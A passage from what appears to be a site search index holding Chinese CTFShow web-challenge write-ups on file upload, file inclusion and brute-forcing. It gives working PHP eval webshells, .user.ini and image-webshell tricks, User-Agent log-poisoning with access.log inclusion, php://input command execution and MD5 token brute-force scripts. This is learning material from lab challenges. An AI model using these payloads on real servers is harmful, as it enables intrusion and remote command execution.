\u7684\u6570\u636e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u5bf9\u5e94\u4e00\u4e2a\u3002\u7531\u4e8e\u5f00\u53d1/\u8bbe\u8ba1\u4eba\u5458\u5728\u53d1\u5e03\u4ee3\u7801\u65f6\u672a\u5220\u9664\u6587\u4ef6\u5939\u4e2d\u9690\u85cf\u7684.DS_store\uff0c\u53ef\u80fd\u9020\u6210\u6587\u4ef6\u76ee\u5f55\u7ed3\u6784\u6cc4\u6f0f\u3001\u6e90\u4ee3\u7801\u6587\u4ef6\u7b49\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u9732\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"CTFshow \u6587\u4ef6\u4e0a\u4f20","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb151 - Web170</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-153-userini","title":"Web 153 .user.ini","text":"<p>\u8fd9\u4e2a\u9898\u6709\u5fc5\u8981\u5199\u4e00\u5199WP\uff0c\u5728\u4fee\u6539\u4e86\u524d\u7aef\uff0c\u5e76\u4e14Burp\u62e6\u622a\u4fee\u6539MIME\u4e4b\u540e\uff0c.php\u4f9d\u65e7\u662f\u4f20\u4e0d\u4e0a\u53bb\u3002</p> <p>\u90a3\u5c31\u7528.user.ini\uff0c\u5176\u5185\u5bb9\u662f<code>auto_prepend_file=yi.png</code>\uff0c\u7136\u540e\u4f9d\u65e7\u662f\u6539\u524d\u7aef\uff0c\u6539MIME\uff0c\u5c06\u8fd9\u4e2a\u6587\u4ef6\u4e0a\u4f20\u4e86\u4e0a\u53bb\u3002\u7b2c\u4e8c\u6b65\u5c31\u662f\u4e0a\u4f20yi.png\uff08\u56fe\u7247\u9a6c\uff09\uff0c\u8fd9\u4e2a\u5c31\u662fpng\uff0c\u4e5f\u6ca1\u4ec0\u4e48\u597d\u6539\u7684\u3002</p> <p>\u6ce8\u610f\uff01\u8fd9\u4e4b\u540e\u8681\u5251\u8fde\u63a5\u7684\u4e0d\u5e94\u8be5\u662fyi.png\uff0c\u4e5f\u4e0d\u662fyi.php\uff0c\u800c\u5e94\u8be5\u662f.user.ini\u76ee\u5f55\u4e0b\u7684\u4efb\u4f55\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u8fde\u63a5 index.php</p> <p>\u5173\u4e8e.user.ini\uff1a<code>.user.ini</code>\u4f7f\u7528\u8303\u56f4\u5f88\u5e7f\uff0c\u4e0d\u4ec5\u9650\u4e8e Apache \u670d\u52a1\u5668\uff0c\u540c\u6837\u9002\u7528\u4e8e Nginx \u670d\u52a1\u5668\uff0c\u53ea\u8981\u670d\u52a1\u5668\u542f\u7528\u4e86 fastcgi \u6a21\u5f0f (\u901a\u5e38\u975e\u7ebf\u7a0b\u5b89\u5168\u6a21\u5f0f\u4f7f\u7528\u7684\u5c31\u662f fastcgi \u6a21\u5f0f)\u3002</p> <p>\u5c40\u9650\uff1a\u5728.user.ini\u4e2d\u4f7f\u7528\u8fd9\u6761\u914d\u7f6e\u4e5f\u8bf4\u4e86\u662f\u5728\u540c\u76ee\u5f55\u4e0b\u7684\u5176\u4ed6.php \u6587\u4ef6\u4e2d\u5305\u542b\u914d\u7f6e\u4e2d\u6240\u6307\u5b9a\u7684\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u8bf4\u9700\u8981\u8be5\u76ee\u5f55\u4e0b\u5b58\u5728.php \u6587\u4ef6\uff0c\u901a\u5e38\u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\uff0c\u4e00\u822c\u662f\u4e13\u95e8\u6709\u4e00\u4e2a\u76ee\u5f55\u7528\u6765\u5b58\u5728\u56fe\u7247\uff0c\u53ef\u80fd\u5c0f\u6982\u7387\u4f1a\u5b58\u5728.php \u6587\u4ef6\u3002</p> <p>\u4f46\u662f\u6709\u65f6\u53ef\u4ee5\u4f7f\u7528 ../ \u6765\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230\u5176\u4ed6\u76ee\u5f55\uff0c\u8fbe\u5230\u4e00\u4e2a\u5229\u7528\u7684\u6548\u679c\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-154","title":"Web 154","text":"<p>\u76f8\u5bf9\u4e8e\u4e0a\u4e00\u5173\u6765\u8bf4\uff0c\u8fc7\u6ee4\u4e86php\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u5199\u7ed5\u8fc7\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528php\u77ed\u6807\u7b7e\u3002</p> <p>\u4f46\u662f\u95ee\u9898\u662f\uff0c\u6211\u662f\u770b\u4e86WP\u624d\u77e5\u9053\u7684\u554a\u2026\u2026\uff08\u6d41\u6c57\u9ec4\u8c46\uff09\u8fd9\u8be5\u548b\u529e\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-156","title":"Web 156","text":"<p>\u8fd9\u5173\u66f4\u79bb\u8c31\uff0c\u8fc7\u6ee4\u4e86<code>[]</code>\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u7528\u82b1\u62ec\u53f7\u66ff\u4ee3\u4e2d\u62ec\u53f7\uff0c\u4e00\u53e5\u8bdd\u6728\u9a6c\u5c31\u53ea\u80fd\u662f</p> <p><code>&lt;?= @eval($_POST{'a'});?&gt;</code></p> <p>\u8fd9\u4e0d\u770bWP\u600e\u4e48\u4f1a\u77e5\u9053\u554a\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-157-158","title":"Web 157-158","text":"<p>\u8d8a\u6765\u8d8a\u79bb\u8c31\u4e86\uff0c\u8fd9\u4e00\u5173\u8fc7\u8fc7\u6ee4\u4e86<code>php</code>\u3001<code>[]</code>\u3001<code>{}</code>\u3001<code>;</code>\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u6267\u884c\u4efb\u610fphp\u8bed\u53e5\u5440\uff0c\u53ea\u662f\u6ca1\u529e\u6cd5\u4e0a\u4f20php\u4e86\u800c\u5df2\u3002\u6240\u4ee5\u8fd8\u662f\u5148\u4e0a\u4f20.user.ini\uff0c\u7136\u540e\u4e0a\u4f20\u56fe\u7247\u7684\u5185\u5bb9\u5e94\u8be5\u662f<code>&lt;?=system('ls ../')?&gt;</code>\u3002</p> <p>\u6216\u8005\u76f4\u63a5<code>&lt;?=system(tac ../fla*)?&gt;</code></p> <p>\u4f46\u662f\u4f1a\u62a5\u9519\u201cParse error:  syntax error, unexpected '.' in /var/www/html/upload/yi.png on line 1\u201d</p> <p>\u90a3\u6211\u4eec\u5c31\u7a0d\u7a0d\u4fee\u6539\u4e00\u4e0b\uff0c<code>&lt;?=system(\"tac ../fl*\")?&gt;</code></p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-159","title":"Web 159","text":"<p>\u672c\u9898\u8fc7\u6ee4\u6389\u4e86<code>php</code>\u3001<code>{}</code>\u3001<code>[]</code>\u3001<code>;</code>\u3001<code>()</code>\u3002</p> <p>\u6240\u4ee5\u5c31\u65e0\u6cd5\u8c03\u7528\u6240\u6709\u7684\u51fd\u6570\u4e86\uff0c\u4f46\u662f\u80fd\u5229\u7528php\u7279\u6027\uff0c\u547d\u4ee4\u6267\u884c\u53ef\u4ee5\u7528``\uff08\u53cd\u5f15\u53f7\u5305\u6db5\uff09</p> PHP<pre><code>&lt;?=`nl ../fl*`?&gt;\n&lt;?=`tac ../fl*`?&gt;\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-160","title":"Web 160","text":"<p>\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\uff0c\u5b58\u653e\u65e5\u5fd7\u6587\u4ef6\u5730\u65b9\u548c\u6587\u4ef6\u540d\u4e0d\u540c</p> <p>apache\u4e00\u822c\u662f/var/log/apache/access.log</p> <p>nginx\u7684log\u5728/var/log/nginx/access.log\u548c/var/log/nginx/error.log</p> <p>\u7531\u4e8e\u8bbf\u95eeURL\u65f6\u8bbf\u95eeURL\u65f6\uff0c\u670d\u52a1\u5668\u4f1a\u5bf9\u5176\u7f16\u7801\uff0c\u6240\u4ee5\u5f97\u901a\u8fc7\u6293\u5305\u7684\u5f62\u5f0f\u5c1d\u8bd5\u6ce8\u5165 </p> <p>\u6dfb\u52a0\u4e86\u65e5\u5fd7\u5305\u542b\uff0cnginx\u7684\u65e5\u5fd7\u5728<code>/var/log/nginx/access.log</code>\uff0c\u540c\u65f6\u8fc7\u6ee4\u4e86<code>log</code>\uff0c\u7528\u53e5\u70b9.\u62fc\u63a5</p> <p><code>&lt;?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?&gt;</code></p> <p>\u8fd9\u91cc\u8981\u4e24\u6b21\u5305\u542b\uff0c\u9996\u5148.user.ini\u5305\u542b\u6728\u9a6cphp\uff0c\u518d\u4e0a\u4f20\u6728\u9a6cphp\u5305\u542b\u65e5\u5fd7\uff0c\u540c\u65f6UA\u5934\u66f4\u6539\u6210tac\u8bed\u53e5\uff1a<code>&lt;?php @eval($_POST['a']);?&gt;</code></p> <p>\u8fd9\u4e2a\u9898\u8be6\u7ec6\u8bf4\u4e00\u4e0b\u5427\uff0c\u5148\u6539\u524d\u7aef\uff0c\u5c06\u5408\u6cd5\u540e\u7f00\u6539\u6210<code>ini</code>\uff0c\u7136\u540e\u6253\u5f00\u62e6\u622a\uff0c\u4e0a\u4f20<code>.user.ini</code>\uff0c\u7136\u540e\u5728Burp\u4e2d\u4fee\u6539MIME\u4e3a<code>image/png</code>\uff0c\u5185\u5bb9\uff1a<code>auto_prepend_file=yi.png</code>\uff0c\u7136\u540e\u518d\u6539\u524d\u7aef\uff0c\u6539\u6210png\uff0c\u7136\u540e\u4e0a\u4f20<code>yi.png</code>\uff0c\u5185\u5bb9\uff1a<code>&lt;?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?&gt;</code>\uff0c\u4e0a\u4f20png\u7684\u540c\u65f6\u62e6\u622a\u4fee\u6539UA\u4e3a<code>&lt;?php @eval($_POST['a']);?&gt;</code>\uff0c\u7136\u540e\u5c31OK\u4e86\uff0c\u8681\u5251\u8fde\u63a5<code>URL/uypload/index.php</code>\u6216\u8005\u76f4\u63a5<code>URL/uypload/</code>\u5c31\u884c\u4e86\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-161-getimagesize","title":"Web 161 getimagesize()","text":"<p>\u53ef\u53c2\u8003 : https://blog.csdn.net/weixin_43915842/article/details/90183305</p> <p>\u6211\u76f4\u63a5\u770b\u4e86WP\uff0c\u8fd9\u4e2a\u9898\u7528<code>getimagesize()</code>\u5bf9\u6587\u4ef6\u5934\u505a\u4e86\u68c0\u6d4b\uff0c\u800c\u4e14WP\u51e0\u4e4e\u90fd\u662f\u7528\u7684GIF\u7684\u6587\u4ef6\u5934<code>GIF89a</code>\uff0c\u90a3\u6211\u4e5f\u5c31\u5148\u8fd9\u6837\u4e86\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u540e\u53f0\u4f1a\u5bf9\u7528\u6237\u4e0a\u4f20\u7684\u6bcf\u4e2a\u6587\u4ef6\u90fd\u8fdb\u884c\u68c0\u9a8c\uff0c\u6240\u4ee5\u4e0d\u7ba1\u662f<code>.user.ini</code>\u8fd8\u662f\u6211\u4eec\u8981\u4e0a\u4f20\u7684\u56fe\u7247\uff0c\u90fd\u9700\u8981\u5728\u6587\u4ef6\u6700\u5f00\u59cb\u52a0\u4e00\u4e2a<code>GIF89a</code>\uff0c\u5176\u4f59\u7684\u548c\u4e0a\u4e00\u5173\u4e00\u6837\uff0c\u65e5\u5fd7\u5305\u542b+UA\u3002</p> <p>\u4e0b\u9762\u5c1d\u8bd5\u4e00\u4e0bPNG\u5934<code>\u2030PNG</code>\uff0cJPG\u7684\u5c31\u4e0d\u8003\u8651\u4e86\uff0cJPG\u5934\u633a\u4e71\u7684\u3002\u4e0d\u884c\uff0c\u8fde.user.ini\u90fd\u4f20\u4e0d\u4e0a\u53bb\u3002</p> <p>\u56fe\u7247\u9a6c\u5236\u4f5c\u7684\u4e09\u79cd\u65b9\u6cd5\uff1a</p> <ol> <li>\u76f4\u63a5\u4f2a\u9020<code>GIF89a</code>\u8fd9\u79cd</li> <li>CMD\uff1acopy /b test.png + yijuhua.php result.png</li> <li>\u4f7f\u7528GIMP\uff08\u5f00\u6e90\u7684\u56fe\u7247\u4fee\u6539\u8f6f\u4ef6\uff09\uff0c\u901a\u8fc7\u589e\u52a0\u5907\u6ce8\uff0c\u5199\u5165\u6267\u884c\u547d\u4ee4\u3002</li> </ol>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#web-162","title":"Web 162","text":"<p>\u770b\u4e86\u770bWP\uff0c\u8fc7\u6ee4\u4e86\u5c0f\u6570\u70b9\uff0c\u6709\u4e2a\u662f\u7ed9\u4e86python\u811a\u672c\uff0c\u4e5f\u4e0d\u4f1a\u7528\u3002\u8fd8\u6709\u4e00\u4e2a\u7528\u4e86VPS\uff08\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\uff08ip\u8f6c\u6570\u5b57\uff09\uff0c\u8fd9\u8ba9\u6211\u548b\u505a\u2026\u2026</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"CTFshow \u6587\u4ef6\u5305\u542b","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb78 - Web88 | Web116 - Web117</p>"},{"location":"WEB/CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#web-80","title":"Web 80","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['file'])) {\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    include($file);\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u672c\u5173\u8fc7\u6ee4\u4e86php\u548cdata\u5e94\u8be5\u662f\u4e0d\u5141\u8bb8\u4f7f\u7528\u4f2a\u534f\u8bae\uff0c\u4f46\u662f\u53ef\u4ee5\u6b63\u5e38\u5305\u542b\uff0c\u91c7\u7528\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u7684\u65b9\u5f0f\u3002</p> <p>\u65e5\u5fd7\u6587\u4ef6\u4e2d\u5305\u542b\u4e86 url\u4ee5\u53caua\u4fe1\u606f\u7b49\uff0c\u8fd9\u91ccua\u6700\u5bb9\u6613\u63a7\u5236\uff0c\u6293\u5305\u6539ua\uff0c\u5199\u5165\u4e00\u53e5\u8bdd\u5373\u53ef\u3002\u5982\u4e0b\u7b2c\u4e09\u884c</p> HTTP<pre><code>GET /?file=/var/log/nginx/access.log HTTP/1.1\nHost: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[2]);?&gt;\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nDNT: 1\nCookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c\nConnection: close\n</code></pre> <p>\u53ef\u4ee5\u76f4\u63a5\u547d\u4ee4\u6267\u884c\u5373\u53ef\u4e5f\u53ef\u4ee5\u7528webshell\u540e\u95e8\u5de5\u5177\u8fde\u63a5</p> Text Only<pre><code>?file=/var/log/nginx/access.log&amp;2=system('ls /var/www/html');phpinfo();\n?file=/var/log/nginx/access.log&amp;2=system('tac /var/www/html/fl0g.php');phpinfo();\n</code></pre> <p>\u5bfb\u627ePHPinfo\u4fe1\u606f\u524d\u9762\u7684\u90a3\u4e00\u6bb5\u4fe1\u606f\u5373\u53ef\u627e\u5230</p> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a</p> <p>\u5bf9\u4e8ephp \u548cdata \u5df2\u7ecf\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u6240\u4ee5\u90fd\u4e0d\u80fd\u7528\uff0c\u4f46\u662f\u7528POST \u7684\u65b9\u6cd5\uff0c\u8fd8\u80fd\u7528\uff0c\u4e3a\u4e86\u4e0d\u88ab\u8fc7\u6ee4\uff0cphp://input \u6539\u6210PHP://input</p> <p>GET\u65b9\u6cd5\u6539\u4e3aPOST\u65b9\u6cd5\u6700\u540e\u6dfb\u52a0\u4e00\u884c\uff0c\u5185\u5bb9\u662f\u9700\u8981\u5305\u542b\u7684php\u4ee3\u7801\u3002\u6267\u884c\u4e3a\uff1a</p> <p>/?file=PHP://input HTTP/1.1</p> <p>POST\u6570\u636e\u90e8\u5206\uff1a<code>&lt;?php system('ls *.php');?&gt;</code></p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/","title":"CTFshow \u7206\u7834","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb21 - Web28</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-25","title":"Web 25\u5f85\u89e3\u51b3","text":""},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-22","title":"Web 22 \u7206\u7834\u5b50\u57df\u540d","text":"<p>\u9898\u76ee\u63d0\u793a\uff1a\u57df\u540d\u4e5f\u53ef\u4ee5\u7206\u7834\u7684\uff0c\u8bd5\u8bd5\u7206\u7834\u8fd9\u4e2actf.show\u7684\u5b50\u57df\u540d \u65e2\u7136\u662f\u57df\u540d\u7206\u7834\uff0c\u8fd9\u91cc\u6211\u7528\u7684Layer\uff0c\u8f93\u5165\u57df\u540d\u540e\u5f00\u59cb\u7206\u7834</p> <p>\u5de5\u5177\uff1aLayer\u5b50\u57df\u540d\u6316\u6398\u673a \u6216 Oneforall\u5de5\u5177</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-23","title":"Web 23 \u811a\u672c","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\n\ninclude('flag.php');\nif (isset($_GET['token'])) {\n    $token = md5($_GET['token']);\n    if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {\n        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {\n            echo $flag;\n        }\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#_1","title":"\u901a\u4e49\u7075\u7801\uff1a","text":"<p>\u8be5PHP\u51fd\u6570\u7684\u529f\u80fd\u662f\u9a8c\u8bc1\u4e00\u4e2atoken\u662f\u5426\u6709\u6548\uff0c\u5e76\u6839\u636e\u9a8c\u8bc1\u7ed3\u679c\u8f93\u51fa\u4e00\u4e2a\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\u3002</p> <ol> <li>\u9996\u5148\uff0c\u901a\u8fc7<code>error_reporting(0)</code>\u5173\u95ed\u9519\u8bef\u62a5\u544a\uff0c\u907f\u514d\u5728\u9a8c\u8bc1\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef\u4fe1\u606f\u3002</li> <li>\u7136\u540e\uff0c\u901a\u8fc7<code>include('flag.php')</code>\u5f15\u5165\u4e00\u4e2a\u540d\u4e3a<code>flag.php</code>\u7684\u6587\u4ef6\u3002</li> <li>\u63a5\u4e0b\u6765\uff0c\u901a\u8fc7<code>if (isset($_GET['token']))</code>\u5224\u65ad\u662f\u5426\u5b58\u5728\u540d\u4e3a<code>token</code>\u7684GET\u53c2\u6570\u3002</li> <li>\u5982\u679c\u5b58\u5728<code>token</code>\u53c2\u6570\uff0c\u5219\u901a\u8fc7<code>$token = md5($_GET['token'])</code>\u5c06token\u503c\u8fdb\u884cMD5\u52a0\u5bc6\u3002</li> <li>\u7136\u540e\uff0c\u901a\u8fc7<code>substr($token, 1, 1)</code>\u3001<code>substr($token, 14, 1)</code>\u548c<code>substr($token, 17, 1)</code>\u5206\u522b\u83b7\u53d6token\u7684\u7b2c2\u300115\u548c18\u4e2a\u5b57\u7b26\u3002</li> <li>\u63a5\u4e0b\u6765\uff0c\u901a\u8fc7<code>substr($token, 1, 1) === substr($token, 14, 1)</code>\u548c<code>substr($token, 14, 1) === substr($token, 17, 1)</code>\u5224\u65ad\u7b2c2\u300115\u548c18\u4e2a\u5b57\u7b26\u662f\u5426\u76f8\u7b49\u3002</li> <li>\u5982\u679c\u76f8\u7b49\uff0c\u5219\u901a\u8fc7<code>intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)</code>\u8ba1\u7b97\u4e00\u4e2a\u6570\u503c\u3002</li> <li>\u7136\u540e\uff0c\u901a\u8fc7<code>intval(substr($token, 31, 1))</code>\u83b7\u53d6token\u7684\u7b2c32\u4e2a\u5b57\u7b26\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u6574\u6570\u3002</li> <li>\u6700\u540e\uff0c\u901a\u8fc7<code>(intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))</code>\u5224\u65ad\u8ba1\u7b97\u5f97\u5230\u7684\u6570\u503c\u662f\u5426\u7b49\u4e8e\u7b2c32\u4e2a\u5b57\u7b26\u7684\u6574\u6570\u503c\u3002</li> <li>\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u8f93\u51fa<code>$flag</code>\u53d8\u91cf\u7684\u503c\u3002</li> <li>\u5982\u679c\u4e0d\u5b58\u5728<code>token</code>\u53c2\u6570\uff0c\u5219\u901a\u8fc7<code>highlight_file(__FILE__)</code>\u9ad8\u4eae\u663e\u793a\u5f53\u524d\u6587\u4ef6\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u8be5\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u98ce\u9669\uff0c\u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528\u4e86\u7528\u6237\u8f93\u5165\u7684token\u8fdb\u884c\u9a8c\u8bc1\uff0c\u53ef\u80fd\u5b58\u5728\u6ce8\u5165\u653b\u51fb\u7684\u98ce\u9669\u3002\u5efa\u8bae\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u8fdb\u884c\u6539\u8fdb\u548c\u52a0\u5f3a\u5b89\u5168\u6027\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#_2","title":"\u811a\u672c","text":"<p>PS\uff1a\u4e0d\u662f\u6211\u5199\u7684\uff0c\u6211\u73b0\u5728\u8fd8\u6ca1\u6709\u5b66\u8fc7python\uff0c\u5c31\u5148\u6574\u7406\u4e86\u4e00\u4e0b\u522b\u4eba\u7684\u3002</p> Python<pre><code>import hashlib\n\ndef intval(_char):\n\n    if _char.isdigit():\n\n        return int(_char)\n\n    return 0\n\nfor i in range(999999):\n\n    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n\n    if md5[1] == md5[14] and md5[14] == md5[17]:\n\n        if md5[1].isdigit() and int(md5[1]) != 0:\n\n            if (intval(md5[1]) + intval(md5[14]) + intval(md5[17]))/int(md5[1]) == intval(md5[31]):\n\n                print(i, md5)\n</code></pre> Python<pre><code>import hashlib\n\ndic = '0123456789qazwsxedcrfvtgbyhnujmikolp'\n\nfor a in dic:\n    for b in dic:\n        t = str(a)+str(b)\n\n        md5 = hashlib.md5(t.encode('utf-8')).hexdigest()\n\n        if md5[1] != md5[14] or md5[14]!= md5[17]:\n\n            continue\n\n        if(ord(md5[1]))&gt;=48 and ord(md5[1])&lt;=57 and (ord(md5[31]))&gt;=48 and ord(md5[31])&lt;=57:\n\n            if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):\n\n                print(t)\n\n# \u5f97\u5230token=3j\n</code></pre> Python<pre><code>import hashlib\n\ndic = '0123456789qazwsxedcrfvtgbyhnujmikolp'\n\nfor a in dic:\n\n    for b in dic:\n\n        t = str(a)+str(b)\n\n        md5 = hashlib.md5(t.encode('utf-8')).hexdigest()\n\n        if md5[1:2] == md5[14:15] and md5[14:15]== md5[17:18]:\n\n            if(ord(md5[1:2]))&gt;=48 and ord(md5[1:2])&lt;=57 and (ord(md5[14:15]))&gt;=48 and ord(md5[14:15])&lt;=57:\n\n                if (ord(md5[17:18]))&gt;=48 and ord(md5[17:18])&lt;=57 and (ord(md5[31:32]))&gt;=48 and ord(md5[31:32])&lt;=57:\n\n                    if(int(md5[1:2])+int(md5[14:15])+int(md5[17:18]))/int(md5[1:2])==int(md5[31:32]):\n\n                        print(t)\n</code></pre> Python<pre><code>import hashlib\n\nfor i in range(10000000):\n\n    token = hashlib.md5(str(i).encode()).hexdigest()\n\n    if token[1] == token[14] == token[17]:\n\n        if (int(token[1], 16) + int(token[14], 16) + int(token[17], 16)) / int(token[1], 16) == int(token[31], 16):\n\n            print(f\"Found token: {i}\")\n\n            break\n</code></pre> Python<pre><code>import hashlib\n\nfor i in range(100000):\n\n    hash_value = hashlib.md5(str(i).encode()).hexdigest()\n\n    if hash_value[-1] == \"3\" and hash_value[1] == hash_value[14] == hash_value[17]:\n\n        print(f\"\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6570\u5b57\uff1a{i}\uff0c\u5176MD5\u503c\u4e3a\uff1a{hash_value}\")\n</code></pre> <p>PHP\uff1a</p> PHP<pre><code>&lt;?php\n$chars = array(\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\", \"K\", \"L\", \"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\");\n\nfunction get_token($str)\n{\n\n    $token = md5($str);\n\n    if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {\n\n        if (substr($token, 1, 1) != 0) {\n\n            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {\n\n                echo $str . ' ';\n            }\n        }\n    }\n}\n\n//\u5982\u679c1\u5c42\u6ca1\u8fd0\u7b97\u6210\u529f \u90a3\u4e48\u5c31\u8fd0\u7b97\u4e24\u5c42 \u4e24\u5c42\u4e0d\u591f \u8fd0\u7b97\u4e09\u5c42\u3002\n\nforeach ($chars as $k =&gt; $v) {\n\n    foreach ($chars as $kk =&gt; $vv) {\n\n        get_token($v . $vv);\n    }\n}\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-24","title":"Web 24 \u4f2a\u968f\u673a\u6570","text":"<p>\u8fd9\u4e2a\u9898\u5f88\u6709\u610f\u601d\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\n\ninclude(\"flag.php\");\nif (isset($_GET['r'])) {\n    $r = $_GET['r'];\n    mt_srand(372619038);\n    if (intval($r) === intval(mt_rand())) {\n        echo $flag;\n    }\n} else {\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?&gt;\n</code></pre> <p>php\u4f2a\u968f\u673a\u6570<code>mt_rand()</code>\u51fd\u6570</p> <p>\u5148\u662fmt_srand(372619038)\uff0c\u64ad\u79cd\u4e86\u4e00\u4e2a\u968f\u673a\u6570\u79cd\u5b50\uff0c\u7136\u540e\u6bd4\u8f83\u7528\u6237\u4f20\u7684GET\u53c2\u6570r\u4e0e\u5426\u4e0emt_rand()\u751f\u6210\u7684\u968f\u673a\u6570\u4e00\u6837\uff0c\u82e5\u4e00\u6837\u5219\u8f93\u51faflag\u3002</p> <p>\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u53d1\u9001\u7684GET\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\u4e0e\u540e\u53f0\u751f\u6210\u7684\u968f\u673a\u6570\u4e00\u6837\u5373\u53ef\u83b7\u53d6flag\u3002</p> 